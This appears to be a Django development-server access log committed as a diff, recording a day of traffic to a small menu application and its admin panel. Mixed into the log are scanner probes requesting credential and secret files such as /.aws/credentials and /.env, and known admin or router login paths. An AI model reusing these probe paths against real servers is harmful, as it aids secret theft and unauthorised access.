+[09/May/2022 01:50:42] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0
+[09/May/2022 01:50:42] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[09/May/2022 01:50:42] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
+[09/May/2022 01:50:42] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[09/May/2022 01:50:42] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0
+[09/May/2022 01:50:42] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+[09/May/2022 01:50:42] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+[09/May/2022 01:50:42] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+[09/May/2022 01:50:50] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[09/May/2022 01:50:50] "GET /static/admin/css/forms.css HTTP/1.1" 200 8878
+[09/May/2022 01:50:50] "GET /static/admin/js/calendar.js HTTP/1.1" 200 8466
+[09/May/2022 01:50:50] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[09/May/2022 01:50:50] "GET /static/admin/js/change_form.js HTTP/1.1" 200 606
+[09/May/2022 01:50:50] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 492
+[09/May/2022 01:50:50] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 200 19634
+[09/May/2022 01:50:50] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
+[09/May/2022 01:50:50] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
+[09/May/2022 01:50:50] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
+[09/May/2022 01:50:50] "GET /static/admin/js/core.js HTTP/1.1" 304 0
+[09/May/2022 01:50:50] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
+[09/May/2022 01:50:50] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
+[09/May/2022 01:50:50] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[09/May/2022 01:50:50] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
+[09/May/2022 01:50:50] "GET /static/admin/css/widgets.css HTTP/1.1" 200 11097
+[09/May/2022 01:50:51] "GET /static/admin/img/icon-calendar.svg HTTP/1.1" 200 1086
+[09/May/2022 01:51:59] "POST /menu/ HTTP/1.1" 200 225
+[09/May/2022 01:52:11] "POST /menu/ HTTP/1.1" 200 211
+Not Found: /ReportServer
+[09/May/2022 01:53:20] "GET /ReportServer HTTP/1.1" 404 2231
+[09/May/2022 01:53:23] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 01:54:43] "POST /menu/ HTTP/1.1" 200 211
+[09/May/2022 02:16:24] "POST /menu/ HTTP/1.1" 200 211
+[09/May/2022 02:16:26] "POST /menu/ HTTP/1.1" 200 211
+[09/May/2022 02:34:23] "POST /menu/ HTTP/1.1" 200 211
+[09/May/2022 02:34:38] "POST /menu/ HTTP/1.1" 200 225
+[09/May/2022 02:59:01] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 02:59:08] "POST /menu/ HTTP/1.1" 200 211
+[09/May/2022 02:59:29] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 03:01:05] "POST /menu/ HTTP/1.1" 200 203
+[09/May/2022 03:02:11] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 03:03:31] "POST /menu/ HTTP/1.1" 200 28
+Not Found: /
+[09/May/2022 03:08:13] "GET / HTTP/1.1" 404 2177
+[09/May/2022 03:15:25] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 03:15:41] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 03:21:27] "POST /menu/ HTTP/1.1" 200 211
+[09/May/2022 03:23:05] "GET /admin/ HTTP/1.1" 200 6873
+[09/May/2022 03:23:07] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[09/May/2022 03:23:07] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+Not Found: /
+[09/May/2022 03:23:31] "GET / HTTP/1.1" 404 2177
+[09/May/2022 03:23:58] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[09/May/2022 03:23:59] "GET /admin/menu/menu/ HTTP/1.1" 200 36799
+[09/May/2022 03:23:59] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[09/May/2022 03:23:59] "GET /static/admin/css/changelists.css HTTP/1.1" 304 0
+[09/May/2022 03:23:59] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
+[09/May/2022 03:23:59] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 304 0
+[09/May/2022 03:24:12] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[09/May/2022 03:24:12] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[09/May/2022 03:24:51] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[09/May/2022 03:24:51] "GET /admin/menu/menu/ HTTP/1.1" 200 37360
+[09/May/2022 03:24:51] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[09/May/2022 03:25:58] "POST /menu/ HTTP/1.1" 200 328
+[09/May/2022 03:26:07] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 03:28:34] "POST /menu/ HTTP/1.1" 200 225
+[09/May/2022 03:32:17] "POST /menu/ HTTP/1.1" 200 211
+[09/May/2022 03:32:42] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 03:33:03] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 03:33:48] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 03:33:59] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 03:34:47] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 03:37:28] "POST /menu/ HTTP/1.1" 200 225
+[09/May/2022 03:38:17] "POST /menu/ HTTP/1.1" 200 211
+[09/May/2022 03:38:24] "POST /menu/ HTTP/1.1" 200 195
+[09/May/2022 03:59:56] "POST /menu/ HTTP/1.1" 200 328
+[09/May/2022 04:00:26] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 04:02:20] "POST /menu/ HTTP/1.1" 200 211
+[09/May/2022 04:02:29] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 04:02:36] "POST /menu/ HTTP/1.1" 200 173
+[09/May/2022 04:20:47] "POST /menu/ HTTP/1.1" 200 225
+[09/May/2022 04:21:03] "GET /admin/ HTTP/1.1" 200 6873
+[09/May/2022 04:21:06] "GET /admin/menu/menu/ HTTP/1.1" 200 37157
+[09/May/2022 04:21:06] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[09/May/2022 04:21:08] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[09/May/2022 04:21:08] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[09/May/2022 04:21:49] "GET /admin/ HTTP/1.1" 200 6873
+[09/May/2022 04:22:05] "GET /admin/ HTTP/1.1" 200 6873
+[09/May/2022 04:22:09] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[09/May/2022 04:22:09] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[09/May/2022 04:23:06] "POST /menu/ HTTP/1.1" 200 328
+[09/May/2022 05:23:00] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 05:23:23] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 05:23:49] "POST /menu/ HTTP/1.1" 200 28
+Not Found: /seeyon/index.jsp
+[09/May/2022 05:43:29] "GET /seeyon/index.jsp HTTP/1.1" 404 2243
+Not Found: /favicon.ico
+[09/May/2022 05:43:29] "GET /favicon.ico HTTP/1.1" 404 2231
+[09/May/2022 05:43:59] "POST /menu/ HTTP/1.1" 200 328
+[09/May/2022 05:48:52] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 05:48:58] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 05:53:47] "POST /menu/ HTTP/1.1" 200 28
+Not Found: /
+[09/May/2022 05:59:18] "GET / HTTP/1.1" 404 2177
+[09/May/2022 06:34:22,959] - Broken pipe from ('167.248.133.62', 60048)
+
+Not Found: /
+[09/May/2022 06:34:24] "GET / HTTP/1.1" 404 2180
+[09/May/2022 06:34:24,315] - Broken pipe from ('167.248.133.62', 50190)
+
+Not Found: /
+[09/May/2022 06:34:24] "GET / HTTP/1.1" 404 2177
+[09/May/2022 06:34:24] code 505, message Invalid HTTP version (2.0)
+[09/May/2022 06:34:24] "PRI * HTTP/2.0" 505 -
+[09/May/2022 07:02:18] "POST /menu/ HTTP/1.1" 200 328
+[09/May/2022 07:02:35] "POST /menu/ HTTP/1.1" 200 211
+[09/May/2022 07:08:03] "GET /admin/ HTTP/1.1" 302 0
+[09/May/2022 07:08:03] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[09/May/2022 07:08:03] "GET /static/admin/css/base.css HTTP/1.1" 200 19513
+[09/May/2022 07:08:03] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 2616
+[09/May/2022 07:08:03] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 3401
+[09/May/2022 07:08:03] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18575
+[09/May/2022 07:08:03] "GET /static/admin/css/login.css HTTP/1.1" 200 954
+[09/May/2022 07:08:04] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[09/May/2022 07:08:04] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[09/May/2022 07:08:04] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[09/May/2022 07:08:13] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[09/May/2022 07:08:17] "POST /admin/login/?next=/admin/ HTTP/1.1" 200 2375
+[09/May/2022 07:08:25] "POST /admin/login/?next=/admin/ HTTP/1.1" 200 2375
+[09/May/2022 07:08:29] "GET /admin/ HTTP/1.1" 302 0
+[09/May/2022 07:08:29] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[09/May/2022 07:08:43] "POST /admin/login/?next=/admin/ HTTP/1.1" 200 2375
+Not Found: /
+[09/May/2022 07:17:01] "GET / HTTP/1.1" 404 2180
+Not Found: /manager/html
+[09/May/2022 07:27:03] "GET /manager/html HTTP/1.1" 404 2231
+Not Found: /
+[09/May/2022 07:34:13] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[09/May/2022 07:34:14] "GET / HTTP/1.1" 404 2177
+[09/May/2022 07:34:25] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x03\x00\x94\x01\x00\x00\x90\x03\x03bxÒ\x11\x80A\x14çÿ9Þ\x1aU8Ù\x8cíwÌªíÉb\x99}82Á')
+[09/May/2022 07:34:25] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[09/May/2022 07:34:25] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x03\x00\x94\x01\x00\x00\x90\x03\x03bxÒ\x12\x8eúÅ\x18Ùq,mÀê\x19è\x0fáxiáä´Ã¬')
+[09/May/2022 07:34:25] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[09/May/2022 07:44:03] "POST /menu/ HTTP/1.1" 200 195
+[09/May/2022 07:44:27] "POST /menu/ HTTP/1.1" 200 235
+[09/May/2022 07:50:45] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 07:50:56] "POST /menu/ HTTP/1.1" 200 235
+[09/May/2022 07:57:00] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 07:57:06] "POST /menu/ HTTP/1.1" 200 328
+[09/May/2022 07:59:35] "POST /menu/ HTTP/1.1" 200 328
+[09/May/2022 08:12:49] "POST /menu/ HTTP/1.1" 200 235
+Not Found: /
+[09/May/2022 08:34:13] "GET / HTTP/1.1" 404 2177
+[09/May/2022 08:40:42] "POST /menu/ HTTP/1.1" 200 211
+[09/May/2022 08:41:42] "POST /menu/ HTTP/1.1" 200 328
+[09/May/2022 08:43:05] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 08:43:12] "POST /menu/ HTTP/1.1" 200 189
+[09/May/2022 08:43:19] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 08:43:35] "POST /menu/ HTTP/1.1" 200 28
+Not Found: /
+[09/May/2022 08:47:55] "GET / HTTP/1.1" 404 2180
+[09/May/2022 09:00:17] "POST /menu/ HTTP/1.1" 200 328
+[09/May/2022 09:01:03] "POST /menu/ HTTP/1.1" 200 328
+[09/May/2022 09:01:41] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 09:01:55] "POST /menu/ HTTP/1.1" 200 28
+Not Found: /
+[09/May/2022 10:01:37] "GET / HTTP/1.1" 404 2180
+[09/May/2022 11:18:29] code 400, message Bad request version ('À\x14À')
+[09/May/2022 11:18:29] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /
+[09/May/2022 12:03:05] "GET / HTTP/1.0" 404 2188
+Not Found: /
+[09/May/2022 12:12:19] "GET / HTTP/1.1" 404 2177
+Not Found: /favicon.ico
+[09/May/2022 12:12:19] "GET /favicon.ico HTTP/1.1" 404 2228
+Not Found: /
+[09/May/2022 12:19:46] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[09/May/2022 12:35:04] "GET / HTTP/1.1" 404 2177
+[09/May/2022 12:35:51] "GET /admin/ HTTP/1.1" 302 0
+[09/May/2022 12:35:51] "GET /admin/ HTTP/1.1" 302 0
+[09/May/2022 12:35:51] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[09/May/2022 12:35:51] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[09/May/2022 12:35:52] "GET /admin/ HTTP/1.1" 302 0
+[09/May/2022 12:35:52] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[09/May/2022 12:36:06] "POST /admin/login/?next=/admin/ HTTP/1.1" 200 2375
+[09/May/2022 12:36:36] "GET /admin/ HTTP/1.1" 302 0
+[09/May/2022 12:36:36] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[09/May/2022 12:36:48] "POST /admin/login/?next=/admin/ HTTP/1.1" 200 2375
+[09/May/2022 12:36:55] "POST /admin/login/?next=/admin/ HTTP/1.1" 200 2376
+[09/May/2022 12:37:00] "GET /admin/ HTTP/1.1" 302 0
+[09/May/2022 12:37:00] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[09/May/2022 12:37:50] "POST /admin/login/?next=/admin/ HTTP/1.1" 200 2375
+[09/May/2022 12:38:05] "POST /admin/login/?next=/admin/ HTTP/1.1" 200 2375
+Method Not Allowed (GET): /menu/
+Method Not Allowed: /menu/
+[09/May/2022 12:38:08] "GET /menu/ HTTP/1.1" 405 0
+[09/May/2022 12:38:15] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[09/May/2022 12:38:15] "GET /admin/ HTTP/1.1" 200 6873
+[09/May/2022 12:38:15] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 380
+[09/May/2022 12:38:15] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[09/May/2022 12:38:15] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+Not Found: /
+[09/May/2022 13:03:38] "GET / HTTP/1.1" 404 2180
+[09/May/2022 13:34:47] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 13:55:24] "POST /menu/ HTTP/1.1" 200 211
+[09/May/2022 13:55:30] "POST /menu/ HTTP/1.1" 200 235
+[09/May/2022 13:55:35] "POST /menu/ HTTP/1.1" 200 173
+[09/May/2022 13:56:06] "POST /menu/ HTTP/1.1" 200 28
+Not Found: /
+[09/May/2022 14:04:09] "GET / HTTP/1.1" 404 2177
+[09/May/2022 14:04:09,557] - Broken pipe from ('108.39.36.172', 52433)
+
+Not Found: /
+[09/May/2022 14:08:00] "GET / HTTP/1.1" 404 2177
+[09/May/2022 14:17:20] "GET /admin/ HTTP/1.1" 302 0
+[09/May/2022 14:17:20] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[09/May/2022 14:33:28] "POST /menu/ HTTP/1.1" 200 211
+Not Found: /.aws/credentials
+[09/May/2022 14:45:10] "GET /.aws/credentials HTTP/1.1" 404 2243
+[09/May/2022 14:45:10] code 400, message Bad request version (')À\x96Ô\x16Hýg\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+[09/May/2022 14:45:10] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[09/May/2022 14:57:50] "GET /admin/ HTTP/1.1" 200 6873
+[09/May/2022 14:57:55] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[09/May/2022 14:57:55] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 200 19634
+[09/May/2022 14:57:55] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347
+[09/May/2022 14:57:55] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[09/May/2022 14:57:55] "GET /static/admin/css/forms.css HTTP/1.1" 200 8878
+[09/May/2022 14:57:55] "GET /static/admin/js/calendar.js HTTP/1.1" 200 8466
+[09/May/2022 14:57:55] "GET /static/admin/js/core.js HTTP/1.1" 200 5698
+[09/May/2022 14:57:55] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 5984
+[09/May/2022 14:57:55] "GET /static/admin/js/actions.js HTTP/1.1" 200 7872
+[09/May/2022 14:57:55] "GET /static/admin/js/urlify.js HTTP/1.1" 200 7902
+[09/May/2022 14:57:55] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1531
+[09/May/2022 14:57:55] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 288580
+[09/May/2022 14:57:55] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 492
+[09/May/2022 14:57:55] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 232381
+[09/May/2022 14:57:55] "GET /static/admin/js/change_form.js HTTP/1.1" 200 606
+[09/May/2022 14:57:55] "GET /static/admin/css/widgets.css HTTP/1.1" 200 11097
+[09/May/2022 14:57:55] "GET /static/admin/img/icon-calendar.svg HTTP/1.1" 200 1086
+[09/May/2022 14:57:59] "GET /static/admin/img/calendar-icons.svg HTTP/1.1" 200 1094
+Not Found: /config/getuser
+[09/May/2022 17:50:16] "GET /config/getuser?index=0 HTTP/1.1" 404 2248
+Not Found: /
+[09/May/2022 18:37:28] "GET / HTTP/1.1" 404 2180
+[09/May/2022 18:42:58] code 400, message Bad request syntax ('MGLNDD_118.67.132.87_80')
+[09/May/2022 18:42:58] "MGLNDD_118.67.132.87_80" 400 -
+Not Found: /.env
+[09/May/2022 19:33:09] "GET /.env HTTP/1.1" 404 2207
+Not Found: /
+[09/May/2022 19:33:10] "POST / HTTP/1.1" 404 2178
+Not Found: /index.php
+[09/May/2022 22:30:44] "GET /index.php HTTP/1.1" 404 2222
+Not Found: /phpmyadmin/index.php
+[09/May/2022 22:30:44] "GET /phpmyadmin/index.php HTTP/1.1" 404 2255
+Not Found: /
+[09/May/2022 22:32:25] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[09/May/2022 22:48:05] "GET / HTTP/1.1" 404 2177
+Not Found: /boaform/admin/formLogin
+[09/May/2022 23:11:14] "POST /boaform/admin/formLogin HTTP/1.1" 404 2268
+[09/May/2022 23:32:31] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 23:40:20] "POST /menu/ HTTP/1.1" 200 225
+[09/May/2022 23:41:03] "POST /menu/ HTTP/1.1" 200 225
+[09/May/2022 23:44:20] code 400, message Bad request version ('À(À$À\x14À')
+[09/May/2022 23:44:20] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /
+[10/May/2022 00:02:29] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[10/May/2022 00:17:28] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[10/May/2022 00:17:58] "GET / HTTP/1.1" 404 2177
+[10/May/2022 00:19:43] "GET /admin HTTP/1.1" 301 0
+[10/May/2022 00:19:43] "GET /admin/ HTTP/1.1" 302 0
+[10/May/2022 00:19:43] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[10/May/2022 00:19:43] "GET /static/admin/css/base.css HTTP/1.1" 200 19513
+[10/May/2022 00:19:43] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 2616
+[10/May/2022 00:19:43] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 3401
+[10/May/2022 00:19:43] "GET /static/admin/css/login.css HTTP/1.1" 200 954
+[10/May/2022 00:19:43] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18575
+[10/May/2022 00:19:43] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[10/May/2022 00:19:43] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[10/May/2022 00:19:43] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[10/May/2022 00:19:43] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+Not Found: /favicon.ico
+[10/May/2022 00:19:43] "GET /favicon.ico HTTP/1.1" 404 2228
+[10/May/2022 00:19:58] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[10/May/2022 00:19:58] "GET /admin/ HTTP/1.1" 200 6873
+[10/May/2022 00:19:58] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 380
+[10/May/2022 00:19:58] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[10/May/2022 00:19:58] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+Not Found: /favicon.ico
+[10/May/2022 00:19:58] "GET /favicon.ico HTTP/1.1" 404 2228
+[10/May/2022 00:20:02] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[10/May/2022 00:20:03] "GET /static/admin/css/forms.css HTTP/1.1" 200 8878
+[10/May/2022 00:20:03] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[10/May/2022 00:20:03] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 288580
+[10/May/2022 00:20:03] "GET /static/admin/js/calendar.js HTTP/1.1" 200 8466
+[10/May/2022 00:20:03] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347
+[10/May/2022 00:20:03] "GET /static/admin/css/widgets.css HTTP/1.1" 200 11097
+[10/May/2022 00:20:04] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 200 19634
+[10/May/2022 00:20:04] "GET /static/admin/js/core.js HTTP/1.1" 200 5698
+[10/May/2022 00:20:04] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 5984
+[10/May/2022 00:20:04] "GET /static/admin/js/actions.js HTTP/1.1" 200 7872
+[10/May/2022 00:20:04] "GET /static/admin/js/urlify.js HTTP/1.1" 200 7902
+[10/May/2022 00:20:04] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1531
+[10/May/2022 00:20:04] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 492
+[10/May/2022 00:20:04] "GET /static/admin/js/change_form.js HTTP/1.1" 200 606
+[10/May/2022 00:20:04] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 232381
+[10/May/2022 00:20:17] "POST /admin/menu/menu/add/ HTTP/1.1" 200 9725
+[10/May/2022 00:20:17] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[10/May/2022 00:20:21] "POST /admin/menu/menu/add/ HTTP/1.1" 200 9724
+[10/May/2022 00:20:21] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[10/May/2022 00:20:25] "POST /admin/menu/menu/add/ HTTP/1.1" 200 9724
+[10/May/2022 00:20:26] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[10/May/2022 00:20:34] "POST /admin/menu/menu/add/ HTTP/1.1" 200 9667
+[10/May/2022 00:20:34] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[10/May/2022 00:23:17] "POST /menu/ HTTP/1.1" 200 189
+[10/May/2022 00:25:43] "GET /admin/ HTTP/1.1" 200 6873
+[10/May/2022 00:26:25] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[10/May/2022 00:26:25] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[10/May/2022 00:26:29,532] - Broken pipe from ('210.104.204.16', 54912)
+
+[10/May/2022 00:27:39] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[10/May/2022 00:27:40] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9740
+[10/May/2022 00:27:40] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[10/May/2022 00:28:47] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[10/May/2022 00:28:48] "GET /admin/menu/menu/ HTTP/1.1" 200 38531
+[10/May/2022 00:28:48] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6932
+[10/May/2022 00:28:48] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[10/May/2022 00:28:48] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+[10/May/2022 00:29:14] "POST /menu/ HTTP/1.1" 200 327
+[10/May/2022 00:29:49] "GET /admin/ HTTP/1.1" 200 6873
+[10/May/2022 00:29:54] "GET /admin/logout/ HTTP/1.1" 200 1530
+[10/May/2022 00:29:55] "GET /admin/ HTTP/1.1" 302 0
+[10/May/2022 00:29:55] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[10/May/2022 00:30:08] "POST /admin/login/?next=/admin/ HTTP/1.1" 200 2375
+[10/May/2022 00:30:14] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[10/May/2022 00:30:14] "GET /admin/ HTTP/1.1" 200 6873
+[10/May/2022 00:30:18] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[10/May/2022 00:30:18] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[10/May/2022 00:30:24] "POST /admin/menu/menu/add/ HTTP/1.1" 200 9734
+[10/May/2022 00:30:24] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[10/May/2022 00:30:44,097] - Broken pipe from ('210.104.204.16', 54924)
+
+[10/May/2022 00:30:44,098] - Broken pipe from ('210.104.204.16', 54927)
+
+[10/May/2022 00:47:37,162] - Broken pipe from ('162.142.125.7', 42250)
+
+Not Found: /
+[10/May/2022 00:47:38] "GET / HTTP/1.1" 404 2180
+[10/May/2022 00:47:38,546] - Broken pipe from ('162.142.125.7', 41658)
+
+Not Found: /
+[10/May/2022 00:47:38] "GET / HTTP/1.1" 404 2177
+[10/May/2022 00:47:39] code 505, message Invalid HTTP version (2.0)
+[10/May/2022 00:47:39] "PRI * HTTP/2.0" 505 -
+[10/May/2022 00:50:55] "POST /menu/ HTTP/1.1" 200 327
+[10/May/2022 00:51:08] "POST /menu/ HTTP/1.1" 200 327
+[10/May/2022 01:07:44] "POST /menu/ HTTP/1.1" 200 235
+Not Found: /
+[10/May/2022 01:12:27] "GET / HTTP/1.0" 404 2180
+[10/May/2022 01:22:55] "POST /menu/ HTTP/1.1" 200 327
+[10/May/2022 01:33:12] "POST /menu/ HTTP/1.1" 200 235
+[10/May/2022 02:12:53] "POST /menu/ HTTP/1.1" 200 327
+[10/May/2022 02:18:38] "POST /menu/ HTTP/1.1" 200 327
+[10/May/2022 02:19:30] "POST /menu/ HTTP/1.1" 200 327
+Not Found: /
+[10/May/2022 02:28:14] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[10/May/2022 03:19:01] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[10/May/2022 03:21:48] "GET / HTTP/1.1" 404 2180
+[10/May/2022 04:03:50] "POST /menu/ HTTP/1.1" 200 28
+[10/May/2022 04:04:11] "POST /menu/ HTTP/1.1" 200 28
+[10/May/2022 04:04:19] "POST /menu/ HTTP/1.1" 200 177
+[10/May/2022 04:24:51] "POST /menu/ HTTP/1.1" 200 327
+Not Found: /
+[10/May/2022 04:42:32] "GET / HTTP/1.0" 404 2188
+[10/May/2022 04:49:13] "POST /menu/ HTTP/1.1" 200 235
+Not Found: /config/getuser
+[10/May/2022 04:49:49] "GET /config/getuser?index=0 HTTP/1.1" 404 2248
+Not Found: /
+[10/May/2022 04:54:53] "GET / HTTP/1.1" 404 2180
+[10/May/2022 05:14:57,872] - Broken pipe from ('167.94.138.120', 34584)
+
+Not Found: /
+[10/May/2022 05:14:59] "GET / HTTP/1.1" 404 2180
+[10/May/2022 05:14:59,368] - Broken pipe from ('167.94.138.120', 35310)
+
+Not Found: /
+[10/May/2022 05:14:59] "GET / HTTP/1.1" 404 2177
+[10/May/2022 05:15:00] code 505, message Invalid HTTP version (2.0)
+[10/May/2022 05:15:00] "PRI * HTTP/2.0" 505 -
+[10/May/2022 06:15:38] "POST /menu/ HTTP/1.1" 200 327
+[10/May/2022 06:33:36] "POST /menu/ HTTP/1.1" 200 177
+[10/May/2022 06:33:48] "POST /menu/ HTTP/1.1" 200 235
+Not Found: /
+[10/May/2022 06:49:34] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[10/May/2022 07:10:18] "GET / HTTP/1.0" 404 2188
+Not Found: /
+[10/May/2022 07:31:34] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[10/May/2022 07:31:35] "GET / HTTP/1.1" 404 2177
